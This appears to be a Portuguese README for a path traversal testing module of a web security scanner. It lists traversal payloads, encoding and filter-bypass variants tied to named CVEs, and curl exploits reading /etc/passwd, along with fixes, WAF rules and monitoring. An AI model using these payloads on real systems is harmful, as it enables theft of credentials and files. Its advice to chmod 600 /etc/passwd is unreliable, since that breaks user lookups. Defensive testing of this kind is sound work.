# Path Traversal Tester - Módulo de Testes Directory/Path Traversal

## Descrição

O `path-traversal-tester.sh` é um módulo especializado em testes de **Path Traversal / Directory Traversal**. Utiliza payloads do **PayloadsAllTheThings/Directory Traversal** para validar proteções contra acesso não autorizado a arquivos e diretórios do sistema.

## Motivação

Path Traversal é uma vulnerabilidade **ALTA/CRÍTICA** que permite:
- **File Read**: Leitura de arquivos sensíveis (/etc/passwd, config.php, .env)
- **Source Code Disclosure**: Vazamento de código-fonte da aplicação
- **Credential Theft**: Roubo de chaves SSH, .env, database configs
- **Information Disclosure**: Exposição de secrets, API keys
- **Privilege Escalation**: Acesso a arquivos de sistema

A modularização facilita:
1. **Cobertura Completa**: Linux + Windows + encoding
2. **Filter Bypass**: 25+ técnicas de evasão
3. **Web App Testing**: WordPress, configs, logs
4. **Multi-OS Support**: Payloads específicos por sistema

## Estrutura

O módulo está organizado em 5 categorias principais:

### 1. Path Traversal Básico - Linux (25 testes)

#### Basic ../ Traversal:
```bash
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
```

#### Absolute Paths:
```bash
/etc/passwd
/etc/shadow
/etc/hosts
/etc/group
/etc/issue
/etc/motd
```

#### /proc Filesystem:
```bash
/proc/version              # Kernel version
/proc/self/environ         # Environment variables
/proc/self/cmdline         # Command line
/proc/self/cwd/config.php  # Current working directory
/proc/mounts               # Mounted filesystems
/proc/net/arp              # ARP table
/proc/net/route            # Routing table
/proc/net/tcp              # TCP connections
/proc/net/udp              # UDP connections
```

#### SSH Keys:
```bash
/root/.ssh/id_rsa
/root/.ssh/authorized_keys
/home/$USER/.ssh/id_rsa
```

#### Bash History:
```bash
/root/.bash_history
/home/$USER/.bash_history
```

#### MySQL Config:
```bash
/etc/mysql/my.cnf
/var/lib/mysql/my.cnf
```

#### Kubernetes Secrets:
```bash
/run/secrets/kubernetes.io/serviceaccount/token
/run/secrets/kubernetes.io/serviceaccount/namespace
/run/secrets/kubernetes.io/serviceaccount/certificate
/var/run/secrets/kubernetes.io/serviceaccount
```

### 2. Path Traversal Básico - Windows (20 testes)

#### Basic ..\ Traversal:
```bash
..\..\..\windows\win.ini
..\..\..\..\windows\win.ini
..\..\..\..\..\windows\win.ini
```

#### Absolute Paths:
```bash
C:\windows\win.ini
C:\windows\system32\license.rtf
C:\boot.ini
```

#### IIS Paths:
```bash
C:\inetpub\wwwroot\web.config
C:\inetpub\wwwroot\global.asa
C:\windows\system32\inetsrv\metabase.xml
C:\inetpub\logs\logfiles
```

#### System Files:
```bash
C:\unattend.xml
C:\sysprep.inf
C:\sysprep.xml
C:\windows\repair\sam
C:\windows\repair\system
```

#### UNC Paths:
```bash
\\localhost\c$\windows\win.ini
\\127.0.0.1\c$\windows\win.ini
```

#### Mixed Slashes:
```bash
C:/windows/win.ini         # Forward slash
C:\windows/win.ini         # Mixed
C:\\windows\\..\\windows\\win.ini  # Redundant
```

### 3. Path Traversal Encoding (30 testes)

#### URL Encoding:
```bash
# Basic encoding
%2e%2e%2f = ../
%2e%2e%5c = ..\

# Example
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
```

| Character | Encoded |
|-----------|---------|
| `.` | `%2e` |
| `/` | `%2f` |
| `\` | `%5c` |

#### Double URL Encoding:
```bash
# Double encoding
%252e%252e%252f = ../
%252e%252e%255c = ..\

# Example: Spring MVC CVE-2018-1271
/static/%255c%255c..%255c/..%255c/..%255c/etc/passwd
```

| Character | Double Encoded |
|-----------|----------------|
| `.` | `%252e` |
| `/` | `%252f` |
| `\` | `%255c` |

#### Unicode Encoding:
```bash
%u002e = .
%u2215 = /
%u2216 = \

# Example: Openfire CVE-2023-32315
/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp
```

#### Overlong UTF-8:
```bash
# Invalid but processed by some parsers
%c0%2e = .
%c0%af = /
%c0%5c = \

# Variations
%e0%40%ae = .
%e0%80%af = /

# Example
%c0%ae%c0%ae%c0%afetc/passwd
```

#### Mixed Encoding:
```bash
%2e%2e/%2e%2e/etc/passwd          # Mixed encoded/plain
..%2f..%2f..%2fetc/passwd         # Encode only slash
%2e%2e/..%2fetc/passwd            # Mixed
```

#### Triple Encoding:
```bash
%25252e%25252e%25252fetc/passwd
```

#### Null Byte:
```bash
../../../etc/passwd%00
../../../etc/passwd%00.jpg
.%00./.%00./etc/passwd
```

### 4. Path Traversal Filter Bypass (25 testes)

#### Mangled Path (WAF strips ../):
```bash
..././       # After strip becomes ../
.../.../     # Becomes ../
....//       # Becomes ../
...\.\       # Becomes ..\
```

**Example**: Mirasys DVMS
```bash
/.../.../.../.../.../windows/win.ini
```

#### Reverse Path:
```bash
/etc/../etc/passwd
/var/../etc/passwd
/usr/../etc/passwd
```

#### Null Byte Bypass:

**Homematic CCU3 (CVE-2019-9726)**:
```bash
/.%00./.%00./etc/passwd
```

**Kyocera Printer (CVE-2020-23575)**:
```bash
/wlmeng/../../../../../../../etc/passwd%00index.htm
```

#### Nginx ..;/ Bypass (Reverse Proxy):

Nginx treats `/..;/` as directory, Tomcat treats as `/../`:
```bash
..;/..;/..;/etc/passwd
```

**Pascom Cloud (CVE-2021-45967)**:
```bash
/services/pluginscript/..;/..;/..;/getFavicon
```

#### ASP.NET Cookieless Bypass:

When cookieless sessions are enabled:
```bash
/(S(X))/protected/admin.aspx
/(Y(Z))/admin/main.aspx
/(S(x))/b/(S(x))in/Navigator.dll
```

**CVE-2023-36899**:
```bash
/WebForm/(S(X))/prot/(S(X))ected/target.aspx
```

**CVE-2023-36560**:
```bash
/WebForm/pro/(S(X))tected/target.aspx/(S(X))/
```

#### IIS 8.3 Short Name:
```bash
/PROGRA~1/           # Program Files
/bin::$INDEX_ALLOCATION/
```

Tools:
- [IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner)
- [shortscan](https://github.com/bitquark/shortscan)

#### Java URL Protocol:
```bash
url:file:///etc/passwd
url:http://127.0.0.1:8080
```

#### Different Parameters:
```bash
?file=../../../etc/passwd
?path=../../../etc/passwd
?document=../../../etc/passwd
?page=../../../etc/passwd
?filename=../../../etc/passwd
?load=../../../etc/passwd
```

### 5. Path Traversal Web Applications (20 testes)

#### WordPress:
```bash
../../../wp-config.php
../wp-load.php
../.htaccess
```

#### Common Configs:
```bash
../config.php
../configuration.php
../settings.php
../database.php
```

#### Environment Files:
```bash
../.env
../.env.local
../.env.production
../.env.development
```

#### Git Repository:
```bash
../.git/config
../.git/HEAD
../.git/logs/HEAD
```

#### Logs:
```bash
../error_log
../../logs/access.log
../../logs/error.log
/var/log/nginx/access.log
/var/log/apache2/access.log
```

#### PHP Info:
```bash
../phpinfo.php
../../phpinfo.php
```

#### Package Managers:
```bash
../composer.json
../composer.lock
../package.json
../package-lock.json
../yarn.lock
```

#### Docker:
```bash
../Dockerfile
../docker-compose.yml
../.dockerignore
```

## Uso

### Executar apenas testes Path Traversal
```bash
./head-test.sh -u https://example.com -c pathtraversal
```

### Aliases disponíveis
```bash
./head-test.sh -u https://example.com -c dirtraversal
./head-test.sh -u https://example.com -c lfi
```

### Executar todos os testes
```bash
./head-test.sh -u https://example.com -c all
```

### Com velocidade TURBO
```bash
./head-test.sh -u https://example.com -c pathtraversal --speed 5
```

## Arquitetura

```
head-test.sh
├── source path-traversal-tester.sh
│   ├── test_pt_basic_linux()
│   ├── test_pt_basic_windows()
│   ├── test_pt_encoding()
│   ├── test_pt_filter_bypass()
│   ├── test_pt_web_apps()
│   └── run_all_path_traversal_tests() [principal]
└── PayloadsAllTheThings/Directory Traversal/
    ├── README.md
    └── Intruder/
```

## Quantidade de Testes

**Total: 140+ testes**

- 25 testes básicos Linux
- 20 testes básicos Windows
- 30 testes encoding (URL, double, Unicode, UTF-8)
- 25 testes filter bypass
- 20 testes web applications
- +20 testes Path Traversal (existentes no head-test.sh)

## Comparação com Ferramentas

| Ferramenta | path-traversal-tester.sh | dotdotpwn | dirb |
|------------|--------------------------|-----------|------|
| **Propósito** | Hardening | Fuzzing | Discovery |
| **Velocidade** | ⚡ Rápido | 🐢 Lento | ⚡ Médio |
| **Encoding** | ✅ 30 tipos | ✅ Sim | ❌ Limitado |
| **Filter Bypass** | ✅ 25 técnicas | ❌ Não | ❌ Não |
| **Multi-OS** | ✅ Linux+Win | ✅ Sim | ❌ Linux only |
| **Uso** | CI/CD, hardening | Pentesting | Discovery |

## Casos de Uso

### 1. Hardening Validation
```bash
./head-test.sh -u https://app.com -c pathtraversal --filter fail
```

### 2. CI/CD Integration
```bash
#!/bin/bash
API_URL="https://api.example.com"

./head-test.sh -u "$API_URL" -c pathtraversal --speed 5

if [ $? -ne 0 ]; then
    echo "❌ Path Traversal vulnerabilities detected!"
    exit 1
fi
```

### 3. File Download Endpoints
```bash
# Test download endpoint
./head-test.sh -u "https://app.com/download?file=report.pdf" -c pathtraversal
```

### 4. Image/Document Viewers
```bash
# Test document viewer
./head-test.sh -u "https://app.com/view?doc=document.pdf" -c pathtraversal
```

## Severidade

**CVSS Score**: 6.5-8.5 (HIGH)

Path Traversal permite:
- ✅ **Credential Theft**: SSH keys, .env, database configs (8.5)
- ✅ **Source Code Disclosure**: Código da aplicação (7.5)
- ✅ **Session Hijacking**: Via logs com session IDs (7.0)
- ✅ **Information Disclosure**: Configs, secrets (6.5)

## Exemplo de Exploração

### Código Vulnerável (PHP)
```php
<?php
// VULNERÁVEL!
$file = $_GET['file'];
include("/var/www/docs/" . $file);
?>
```

**Exploit**:
```bash
curl "http://victim.com/page.php?file=../../../../etc/passwd"
```

**Output**:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

### Código Vulnerável (Node.js)
```javascript
// VULNERÁVEL!
app.get('/download', (req, res) => {
    const filename = req.query.file;
    res.sendFile(__dirname + '/files/' + filename);
});
```

**Exploit**:
```bash
curl "http://victim.com/download?file=../../../etc/passwd"
```

### Código Vulnerável (Java/Spring)
```java
// VULNERÁVEL!
@GetMapping("/files/{filename}")
public ResponseEntity<Resource> downloadFile(@PathVariable String filename) {
    Resource file = new FileSystemResource("/var/app/files/" + filename);
    return ResponseEntity.ok(file);
}
```

**Exploit** (CVE-2018-1271):
```bash
curl "http://victim.com/files/%255c%255c..%255c/..%255c/etc/passwd"
```

## Prevenção

### 1. Whitelist de Arquivos

❌ **RUIM**:
```php
$file = $_GET['file'];
include($file);
```

✅ **BOM**:
```php
$allowed_files = ['report.pdf', 'invoice.pdf', 'summary.pdf'];
$file = $_GET['file'];

if (!in_array($file, $allowed_files)) {
    die('File not allowed');
}

include('/var/www/docs/' . $file);
```

### 2. Basename / Realpath

**PHP**:
```php
$file = basename($_GET['file']);  // Strip directory
$path = realpath('/var/www/docs/' . $file);

// Verify it's in allowed directory
if (strpos($path, '/var/www/docs/') !== 0) {
    die('Invalid path');
}

include($path);
```

**Python**:
```python
import os

basedir = '/var/www/docs/'
filename = request.args.get('file')
path = os.path.realpath(os.path.join(basedir, filename))

if not path.startswith(basedir):
    abort(403)

return send_file(path)
```

**Node.js**:
```javascript
const path = require('path');

const basedir = '/var/www/docs/';
const filename = req.query.file;
const filepath = path.resolve(basedir, filename);

if (!filepath.startsWith(basedir)) {
    return res.status(403).send('Forbidden');
}

res.sendFile(filepath);
```

### 3. Input Validation

```php
// Block dangerous characters
if (preg_match('/\.\./', $file)) {
    die('Path traversal detected');
}

// Only allow alphanumeric + specific chars
if (!preg_match('/^[a-zA-Z0-9._-]+$/', $file)) {
    die('Invalid filename');
}
```

### 4. Chroot / Containerização

```bash
# Docker: app runs in isolated filesystem
FROM node:16
WORKDIR /app
COPY . .
USER node  # Non-root
CMD ["node", "server.js"]
```

### 5. File Permissions

```bash
# Restrict read permissions
chmod 600 /etc/passwd
chmod 600 /var/www/html/.env

# Use separate user for web server
chown www-data:www-data /var/www/html/
```

## Detecção e Monitoramento

### 1. WAF Rules

**ModSecurity**:
```nginx
# Block ../ sequences
SecRule ARGS "@rx \\.\\.\/" \
  "id:5001,deny,status:403,msg:'Path Traversal'"

# Block encoded versions
SecRule ARGS "@rx (?:%2e%2e%2f|%252e%252e%252f|%c0%ae%c0%ae%c0%af)" \
  "id:5002,deny,status:403,msg:'Encoded Path Traversal'"

# Block Windows paths
SecRule ARGS "@rx (?:\\.\\.\\/|%5c)" \
  "id:5003,deny,status:403,msg:'Windows Path Traversal'"
```

### 2. Application Logs

```php
// Log suspicious file access attempts
if (strpos($file, '..') !== false) {
    error_log("Path traversal attempt: $file from {$_SERVER['REMOTE_ADDR']}");
}
```

### 3. File Access Monitoring

```bash
# auditd - Monitor /etc/passwd access
auditctl -w /etc/passwd -p r -k passwd_read
auditctl -w /etc/shadow -p r -k shadow_read

# View logs
ausearch -k passwd_read
```

## Próximos Passos

1. **Archive Path Traversal**: ZIP, TAR extraction vulnerabilities
2. **XML Path Traversal**: XXE + Path Traversal combo
3. **Cloud Storage**: S3, GCS path traversal
4. **Mobile Apps**: iOS/Android file access

## Ferramentas Complementares

- **[dotdotpwn](https://github.com/wireghoul/dotdotpwn)**: Directory traversal fuzzer
- **[IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner)**: IIS 8.3 scanner
- **[windowsblindread](https://github.com/soffensive/windowsblindread)**: Windows file list

## Referências

- [PayloadsAllTheThings - Directory Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal)
- [OWASP - Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [PortSwigger - File Path Traversal](https://portswigger.net/web-security/file-path-traversal)
- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)

## FAQ

**Q: Qual diferença entre Path Traversal e LFI?**  
A: Path Traversal acessa arquivos fora do diretório permitido. LFI (Local File Inclusion) executa/inclui o arquivo (permite RCE).

**Q: Por que ../../../ funciona?**  
A: Cada `../` sobe um nível no diretório. 3x garante sair do diretório atual na maioria dos casos.

**Q: Encoding sempre bypassa filtros?**  
A: Não! Depende de como o filtro está implementado. Double encoding às vezes funciona quando single não.

**Q: UNC paths funcionam em Linux?**  
A: Não, apenas Windows. Use `/` em Linux, `\` em Windows.

**Meta final**: 100% de proteção contra Path Traversal!
